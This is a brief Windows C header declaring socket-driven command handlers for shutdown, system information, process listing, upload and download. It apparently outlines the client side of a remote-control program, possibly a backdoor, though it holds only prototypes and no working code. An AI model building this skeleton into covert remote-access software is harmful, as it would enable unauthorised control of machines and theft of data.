#include "..\shared.h"

#include <tchar.h>
#include <wininet.h>
#include <iphlpapi.h>
#include <Psapi.h>

int parseCommand(SOCKET, char* input);
int cmdShutdown();
int cmdInform(SOCKET);
int cmdProc(SOCKET);
int cmdUpload(SOCKET, char* args);
int cmdDownload(char*, char*);

